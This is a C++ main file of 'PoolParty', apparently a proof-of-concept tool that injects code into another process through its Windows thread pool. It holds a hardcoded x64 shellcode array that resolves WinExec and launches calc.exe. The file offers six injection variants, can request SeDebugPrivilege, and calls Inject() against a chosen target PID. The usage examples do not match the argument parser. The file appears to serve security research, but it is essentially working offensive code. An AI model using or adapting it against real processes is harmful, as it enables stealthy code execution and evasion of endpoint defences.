#include "PoolParty.hpp"
#include "Misc.hpp"

// TODO: better naming all over

unsigned char g_Shellcode[] = 
"\xE8\xBA\x00\x00\x00\x48\x8D\xB8\x9E\x00\x00\x00"
"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18"
"\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B"
"\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2"
"\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01"
"\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48"
"\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41"
"\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8"
"\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24"
"\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B"
"\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48"
"\x01\xDA\x49\x89\xD4\x48\xB9\x57\x69\x6E\x45\x78"
"\x65\x63\x00\x51\x48\x89\xE2\x48\x89\xD9\x48\x83"
"\xEC\x30\x41\xFF\xD4\x48\x83\xC4\x30\x48\x83\xC4"
"\x10\x48\x89\xC6\x48\x89\xF9\x48\x31\xD2\x48\xFF"
"\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
"\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";

void PrintUsage()
{
	std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID>" << std::endl << std::endl <<
		"VARIANTS:" << std::endl <<
		"------" << std::endl << std::endl <<
		"#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
		"#2: (RemoteWorkItemInsertion) " << std::endl << "\t+ Insert work item (TP_WORK) to the target process's thread pool" << std::endl << std::endl <<
		"#3: (RemoteWaitCallbackInsertion) " << std::endl << "\t+ Insert wait (TP_WAIT) to the target process's thread pool" << std::endl << std::endl <<
		"#4: (RemoteIoCompletionCallbackInsertion) " << std::endl << "\t+ Insert IO completion (TP_IO) to the target process's thread pool" << std::endl << std::endl <<
		"#5: (RemoteAlpcCallbackInsertion) " << std::endl << "\t+ Insert ALPC (TP_ALPC) to the target process's thread pool" << std::endl << std::endl <<
		"#6: (RemoteJobCallbackInsertion) " << std::endl << "\t+ Insert job (TP_JOB) to the target process's thread pool" << std::endl << std::endl << std::endl <<
		"EXAMPLES:" << std::endl <<
		"------" << std::endl << std::endl <<
		"#1 RemoteWorkItemInsertion against pid <1234> " << std::endl << "\t>>PoolParty.exe 1 1234" << std::endl << std::endl <<
		"#1 RemoteIoCompletionCallbackInsertion against pid <1234> with debug privileges" << std::endl << "\t>>PoolParty.exe 1 1234 --debug" << std::endl << std::endl;
}

POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
	if (argc < 5) {
		throw std::runtime_error("Too few arguments supplied ");
	}

	POOL_PARTY_CMD_ARGS CmdArgs = { 0 };

	std::vector<std::string> args(argv + 1, argv + argc);
	for (auto i = 0; i < args.size(); i++)
	{
		auto CmdArg = args.at(i);

		if (CmdArg == "-V" || CmdArg == "--variant-id")
		{
			CmdArgs.VariantId = stoi(args.at(++i));
			continue;
		}
		if (CmdArg == "-P" || CmdArg == "--target-pid") 
		{
			CmdArgs.TargetPid = stoi(args.at(++i));
			continue;
		}
		if (CmdArg == "-D" || CmdArg == "--debug-privilege")
		{
			CmdArgs.bDebugPrivilege = TRUE;
			continue;
		}
		PrintUsage();
		throw std::runtime_error((boost::format("Invalid option: %s") % CmdArg).str());
	}

	return CmdArgs;
}

// TODO: Add shellcode
std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
{
	switch (VariantId)
	{
	case 1: 
		return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode);
	case 2:
		return std::make_unique<RemoteWorkItemInsertion>(TargetPid, g_Shellcode);
	case 3:
		return std::make_unique<RemoteWaitCallbackInsertion>(TargetPid, g_Shellcode);
	case 4:
		return std::make_unique<RemoteIoCompletionCallbackInsertion>(TargetPid, g_Shellcode);
	case 5:
		return std::make_unique<RemoteAlpcCallbackInsertion>(TargetPid, g_Shellcode);
	case 6:
		return std::make_unique<RemoteJobCallbackInsertion>(TargetPid, g_Shellcode);
	default:
		throw std::runtime_error("Invalid variant ID");
	}
}

void InitLogging() 
{
	//logging::add_common_attributes();

	//logging::register_simple_filter_factory<logging::trivial::severity_level, char>("Severity");
	//logging::register_simple_formatter_factory<logging::trivial::severity_level, char>("Severity");

	// TODO: Filter the ThreadId field of the logger
	//logging::add_console_log(
	//	std::cout, 
	//	keywords::format = "[%TimeStamp%] [%Severity%] %Message%"
	//);

	logging::core::get()->set_filter(
		logging::trivial::severity >= logging::trivial::info
	);
}

int main(int argc, char** argv) {
	InitLogging();

	try 
	{
		const auto CmdArgs = ParseArgs(argc, argv);

		if (CmdArgs.bDebugPrivilege)
		{
			w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE);
			BOOST_LOG_TRIVIAL(info) << "Retrieved SeDebugPrivilege successfully";
		}

		const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid);
		Injector->Inject();
	}
	catch (const std::exception& ex) 
	{
		BOOST_LOG_TRIVIAL(error) << ex.what();
		return 0;
	}
	
	return 1;
}